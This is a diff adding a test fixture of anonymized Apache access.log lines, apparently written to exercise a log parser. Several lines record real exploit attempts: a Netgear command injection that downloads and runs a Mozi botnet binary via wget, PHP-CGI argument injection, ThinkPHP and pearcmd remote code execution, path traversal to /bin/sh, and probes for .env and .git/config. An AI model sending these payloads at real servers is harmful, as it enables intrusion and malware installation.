@@ -1,0 +1,120 @@
+# Real access.log lines, anonymized: client and server addresses use RFC 5737 ranges,
+# the server name uses example.org. Everything else is byte for byte as Apache logged it.
+# Each line is preceded by its label, used by the tests to refer to it.
+
+# new-format-tls13
+198.51.100.1 - - [04/Nov/2026:15:18:21 +0100] "GET /favicon.ico HTTP/1.1" 404 458 "https://server.example.org/" "Mozilla/5.0 (X11; Linux x86_64; rv:159.0) Gecko/20100101 Firefox/159.0" 294 "server.example.org" server.example.org:443 TLSv1.3 236 aus-rckZHr8ACc8rSxFu6AAAAE
+
+# get-tls13-browser-ua
+198.51.100.2 - - [04/Nov/2026:00:32:58 +0100] "GET /wp-login.php HTTP/1.1" 404 5493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36" 359 "192.0.2.1.ipv4.isp.example.net" server.example.org:443 TLSv1.3
+
+# post-tls13
+198.51.100.2 - - [04/Nov/2026:00:32:58 +0100] "POST /xmlrpc.php HTTP/1.1" 404 5493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36" 391 "192.0.2.1.ipv4.isp.example.net" server.example.org:443 TLSv1.3
+
+# get-plain-zgrab
+198.51.100.3 - - [04/Nov/2026:00:39:00 +0100] "GET / HTTP/1.1" 200 1336 "-" "Mozilla/5.0 zgrab/0.x" 1023 "192.0.2.1" server.example.org:80 -
+
+# get-tls13-referer-ip
+198.51.100.4 - - [04/Nov/2026:01:10:51 +0100] "GET /favicon.ico HTTP/1.1" 404 5494 "https://192.0.2.1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36" 336 "192.0.2.1" server.example.org:443 TLSv1.3
+
+# get-referer-self-env
+198.51.100.5 - - [04/Nov/2026:08:39:29 +0100] "GET /.env HTTP/1.1" 404 4417 "http://server.example.org/.env" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 429 "server.example.org" server.example.org:443 TLSv1.3
+
+# get-tls12
+198.51.100.6 - - [04/Nov/2026:08:57:41 +0100] "GET /favicon.ico HTTP/1.1" 404 4144 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0" 801 "192.0.2.1" server.example.org:443 TLSv1.2
+
+# host-ip-port
+198.51.100.7 - - [04/Nov/2026:01:13:52 +0100] "GET /SDK/webLanguage HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" 764 "192.0.2.1:80" server.example.org:80 -
+
+# head
+198.51.100.8 - - [02/Nov/2026:17:13:15 +0100] "HEAD /favicon.ico HTTP/1.1" 404 5256 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36" 253 "server.example.org" server.example.org:443 TLSv1.3
+
+# options
+198.51.100.9 - - [02/Nov/2026:20:28:58 +0100] "OPTIONS / HTTP/1.1" 301 496 "-" "Mozilla/5.0 (l9scan/2.0.13e223e203e2239313; +https://leakix.net)" 122 "server.example.org" server.example.org:80 -
+
+# redirect-301
+198.51.100.9 - - [02/Nov/2026:20:28:27 +0100] "GET / HTTP/1.1" 301 496 "-" "Mozilla/5.0 (l9scan/2.0.13e223e203e2239313; +https://leakix.net)" 154 "server.example.org" server.example.org:80 -
+
+# http10-host-dash-mozi
+198.51.100.10 - - [04/Nov/2026:13:43:23 +0100] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.10:34959/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 830 "-" "-" 563 "-" server.example.org:80 -
+
+# nonstandard-method-501
+198.51.100.3 - - [03/Nov/2026:23:09:53 +0100] "UEQQ / HTTP/1.1" 501 443 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 424 "192.0.2.1" server.example.org:80 -
+
+# query-rest-route
+198.51.100.11 - - [02/Nov/2026:20:29:03 +0100] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 2773 "-" "Mozilla/5.0 (l9scan/2.0.13e223e203e2239313; +https://leakix.net)" 1408 "server.example.org" server.example.org:443 TLSv1.3
+
+# l9scan-debug-panel
+198.51.100.11 - - [02/Nov/2026:20:29:04 +0100] "GET /debug/default/view?panel=config HTTP/1.1" 404 1818 "-" "Mozilla/5.0 (l9scan/2.0.13e223e203e2239313; +https://leakix.net)" 312 "server.example.org" server.example.org:443 TLSv1.3
+
+# git-config
+198.51.100.11 - - [02/Nov/2026:20:28:45 +0100] "GET /.git/config HTTP/1.1" 404 1818 "-" "Mozilla/5.0 (l9scan/2.0.13e223e203e2239313; +https://leakix.net)" 708 "server.example.org" server.example.org:443 TLSv1.3
+
+# percent-encoded-path
+198.51.100.12 - - [04/Nov/2026:06:12:21 +0100] "GET /%E2%9D%A4.php HTTP/1.1" 404 381 "-" "-" 194 "192.0.2.1.ipv4.isp.example.net" server.example.org:80 -
+
+# path-traversal-encoded
+198.51.100.13 - - [03/Nov/2026:22:38:34 +0100] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 432 "-" "libredtail-http" 705 "192.0.2.1:80" server.example.org:80 -
+
+# double-percent-encoded
+198.51.100.13 - - [03/Nov/2026:22:38:35 +0100] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 432 "-" "libredtail-http" 250 "192.0.2.1:80" server.example.org:80 -
+
+# php-cgi-argument-injection
+198.51.100.13 - - [03/Nov/2026:22:38:37 +0100] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 200 2381 "-" "libredtail-http" 655 "192.0.2.1:80" server.example.org:80 -
+
+# php-cgi-double-encoded
+198.51.100.13 - - [03/Nov/2026:22:38:37 +0100] "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 404 436 "-" "libredtail-http" 287 "192.0.2.1:80" server.example.org:80 -
+
+# escaped-backslash
+198.51.100.13 - - [03/Nov/2026:22:38:53 +0100] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 436 "-" "libredtail-http" 179 "192.0.2.1:80" server.example.org:80 -
+
+# escaped-quote
+198.51.100.13 - - [03/Nov/2026:22:38:54 +0100] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 404 436 "-" "libredtail-http" 240 "192.0.2.1:80" server.example.org:80 -
+
+# ua-aiohttp
+198.51.100.14 - - [04/Nov/2026:09:37:38 +0100] "GET / HTTP/1.1" 200 5328 "-" "Python/3.11 aiohttp/3.9.1" 1522 "192.0.2.1" server.example.org:443 TLSv1.3
+
+# ua-go-client
+198.51.100.15 - - [03/Nov/2026:06:46:37 +0100] "HEAD / HTTP/1.1" 200 4232 "-" "Go-http-client/1.1" 751 "server.example.org" server.example.org:443 TLSv1.3
+
+# ua-dash
+198.51.100.12 - - [04/Nov/2026:06:12:19 +0100] "GET /wp-content/plugins/hellopress/wp_filemanager.php HTTP/1.1" 404 381 "-" "-" 728 "192.0.2.1.ipv4.isp.example.net" server.example.org:80 -
+
+# tls-hello-short
+198.51.100.16 - - [04/Nov/2026:02:26:56 +0100] "\x16\x03\x01" 400 432 "-" "-" 278 "-" server.example.org:80 -
+
+# tls-hello-4-bytes
+198.51.100.17 - - [04/Nov/2026:06:21:01 +0100] "\x16\x03\x01\x02" 400 432 "-" "-" 114 "-" server.example.org:80 -
+
+# tls-hello-long
+198.51.100.18 - - [04/Nov/2026:07:22:28 +0100] "\x16\x03\x01\x01\x0c\x01" 400 432 "-" "-" 100 "-" server.example.org:80 -
+
+# tls-hello-printable-byte
+198.51.100.19 - - [03/Nov/2026:09:31:24 +0100] "\x16\x03\x03\x02b\x01" 400 432 "-" "-" 240 "-" server.example.org:80 -
+
+# single-control-byte
+198.51.100.20 - - [02/Nov/2026:20:23:22 +0100] "\x03" 400 432 "-" "-" 153 "-" server.example.org:80 -
+
+# newline-only
+198.51.100.20 - - [02/Nov/2026:20:16:32 +0100] "\n" 400 432 "-" "-" 263 "-" server.example.org:80 -
+
+# weblogic-t3-over-tls
+198.51.100.21 - - [04/Nov/2026:14:32:19 +0100] "t3 12.1.2\n" 400 4409 "-" "-" 141 "-" server.example.org:443 TLSv1.3
+
+# leakix-plain
+198.51.100.9 - - [02/Nov/2026:20:28:12 +0100] "LEAKIX" 400 432 "-" "-" 78 "-" server.example.org:80 -
+
+# leakix-tls
+198.51.100.11 - - [02/Nov/2026:20:28:11 +0100] "LEAKIX" 400 5477 "-" "-" 167 "-" server.example.org:443 TLSv1.3
+
+# ssh-banner
+198.51.100.22 - - [03/Nov/2026:05:59:24 +0100] "SSH-2.0-probe" 400 432 "-" "-" 266 "-" server.example.org:80 -
+
+# timeout-plain-zero-bytes
+198.51.100.23 - - [02/Nov/2026:17:07:05 +0100] "-" 408 0 "-" "-" 56 "-" server.example.org:80 -
+
+# timeout-tls
+198.51.100.24 - - [02/Nov/2026:16:58:24 +0100] "-" 408 5024 "-" "-" 13 "-" server.example.org:443 TLSv1.3
+
+# timeout-tls-other-size
+198.51.100.25 - - [02/Nov/2026:17:39:51 +0100] "-" 408 5040 "-" "-" 108 "-" server.example.org:443 TLSv1.3
